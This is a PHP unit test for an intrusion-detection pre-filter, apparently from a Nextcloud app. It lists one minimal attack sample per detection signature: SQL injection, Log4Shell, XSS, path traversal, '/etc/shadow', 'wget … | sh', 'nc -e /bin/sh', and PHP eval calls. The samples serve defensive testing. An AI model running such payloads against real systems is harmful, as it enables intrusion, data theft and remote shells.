<?php

declare(strict_types=1);

/**
 * SPDX-FileCopyrightText: 2026 Nextcloud GmbH and Nextcloud contributors
 * SPDX-License-Identifier: AGPL-3.0-or-later
 */

namespace OCA\IntrusionDetection\Tests\Unit\Check\Payload;

use OCA\IntrusionDetection\Check\Payload\Base64Inspector;
use OCA\IntrusionDetection\Check\Payload\Normalizer;
use OCA\IntrusionDetection\Check\Payload\PayloadMatcher;
use OCA\IntrusionDetection\Check\Payload\PayloadRules;
use OCA\IntrusionDetection\Check\Payload\PreFilter;
use OCA\IntrusionDetection\Check\Payload\RequestParts;
use OCA\IntrusionDetection\Check\Payload\Signature;
use OCA\IntrusionDetection\Check\Payload\Signatures;
use OCA\IntrusionDetection\Tests\Integration\PayloadCorpus;
use PHPUnit\Framework\Attributes\DataProvider;
use Test\TestCase;

class PreFilterTest extends TestCase {
	/**
	 * One text per signature that the signature matches.
	 */
	private const SAMPLES = [
		'sql_union_select' => '1 union select 1',
		'sql_tautology' => "x' or 'a'='a",
		'sql_numeric_tautology' => '1 or 1=1',
		'sql_sleep' => 'sleep(5)',
		'sql_benchmark' => 'benchmark(1000000,md5(1))',
		'sql_waitfor' => "waitfor delay '0:0:5'",
		'sql_schema' => 'pg_catalog',
		'sql_error_function' => 'updatexml(1,1,1)',
		'sql_file_write' => 'into dumpfile',
		'sql_mssql_procedure' => 'exec xp_cmdshell',
		'sql_stacked_query' => '1; drop table x',
		'sql_subquery' => '1 and (select 1)',
		'sql_order_probe' => "1' order by 3",
		'sql_quote_terminator' => "x';",
		'sql_trailing_comment' => '1--',
		'sql_select_from' => 'select a from b',
		'sql_server_variable' => '@@version',
		'sql_hex_literal' => "0xdeadbeef'--",
		'payload_php_tag' => '<?php',
		'payload_script_tag' => '<script>',
		'payload_log4shell' => '${jndi:ldap://x}',
		'payload_system_file' => '/etc/shadow',
		'payload_javascript_uri' => 'javascript:alert(1)',
		'payload_event_handler' => 'onload=alert(1)',
		'payload_path_traversal' => '../../x',
		'payload_shell_download' => 'wget http://x/y | sh',
		'payload_shell_exec' => '; sh -c id',
		'payload_netcat' => 'nc -e /bin/sh',
		'payload_php_eval' => 'eval(x)',
		'payload_php_exec' => 'passthru(x)',
		'payload_php_decode' => 'gzinflate(x)',
	];

	public function testEverySignatureHasASample(): void {
		$this->assertSame(Signatures::ids(), array_keys(self::SAMPLES));
	}

	/**
	 * A signature without a trigger would be invisible behind the pre-filter.
	 */
	public function testEverySignatureContainsATrigger(): void {
		$matcher = new PayloadMatcher(new Normalizer(), new Base64Inspector());
		$rules = PayloadRules::build(1, 8192, [], [], []);
		foreach (Signatures::builtIn() as $signature) {
			$sample = self::SAMPLES[$signature->id];
			$value = $signature->scope === Signature::SCOPE_ENCODED ? base64_encode($sample . ' padding text') : $sample;
			$this->assertArrayHasKey($signature->id, $matcher->analyse($value, $rules)->strongest()->matches, $signature->id . ' does not match its sample');
			foreach ([rawurlencode($value), str_replace('%20', '+', rawurlencode($value)), self::encodeLetters($value)] as $encoded) {
				$this->assertTrue(PreFilter::hit(RequestParts::fromUri('/index.php/apps/x?v=' . $encoded, '/index.php')), $signature->id . ' passes the pre-filter as ' . $encoded);
			}
			$this->assertTrue(PreFilter::hit(RequestParts::fromUri('/index.php/login', '/index.php', ['v' => $value])), $signature->id . ' passes the pre-filter as a form field');
		}
	}

	/**
	 * @return array<string, array{0: string, 1: string, 2: array<string, string>}>
	 */
	public static function mustFire(): array {
		return PayloadCorpus::mustFire();
	}

	/**
	 * @param array<string, string> $post
	 */
	#[DataProvider('mustFire')]
	public function testTheMustFireCorpusPassesThePreFilter(string $uri, string $script, array $post): void {
		$this->assertTrue(PreFilter::hit(RequestParts::fromUri($uri, $script, $post)));
	}

	/**
	 * @return array<string, array{string}>
	 */
	public static function normal(): array {
		return [
			['/index.php/apps/files/'],
			['/index.php/apps/files/files/12345?dir=/Documents&openfile=true'],
			['/ocs/v2.php/apps/notifications/api/v2/notifications?format=json'],
			['/index.php/core/preview?fileId=12345&x=32&y=32&a=1'],
			['/index.php/avatar/alice/64?v=3'],
			['/index.php/login?redirect_url=%2Fapps%2Ffiles%2F'],
			['/index.php/apps/contactsinteraction/'],
			['/ocs/v2.php/apps/integration_openai/api/v1/models'],
			['/index.php/s/AbCdEfGhIjKlMnO'],
			['/index.php/apps/files_sharing/publicpreview/AbCdEfGhIjKlMnO?x=1920&y=1080&a=true'],
			['/remote.php/dav/files/alice/Documents/Bob\'s%20notes.txt'],
			['/ocs/v2.php/search/providers/files/search?term=quarterly+report&limit=5'],
			['/index.php/apps/calendar/timeGridWeek/now'],
			['/status.php'],
			['/index.php/css/core/server.css?v=abcdef12-34'],
		];
	}

	#[DataProvider('normal')]
	public function testNormalRequestsStopAtThePreFilter(string $uri): void {
		$this->assertFalse(PreFilter::hit(RequestParts::fromUri($uri, null)));
	}

	public function testOnlyTheScanLimitIsScanned(): void {
		$uri = '/index.php/apps/x?a=' . str_repeat('x', PreFilter::MAX_SCAN) . "'";
		$this->assertFalse(PreFilter::hit(RequestParts::fromUri($uri, '/index.php')));
	}

	public function testNestedFormFieldsAreScanned(): void {
		$this->assertTrue(PreFilter::hit(RequestParts::fromUri('/index.php/x', '/index.php', ['a' => ['b' => ['c' => "1' or '1'='1"]]])));
		$this->assertFalse(PreFilter::hit(RequestParts::fromUri('/index.php/x', '/index.php', ['a' => ['b' => 'plain']])));
	}

	private static function encodeLetters(string $value): string {
		return implode('', array_map(static fn (string $c): string => ctype_alpha($c) ? '%' . strtoupper(bin2hex($c)) : rawurlencode($c), str_split($value)));
	}
}
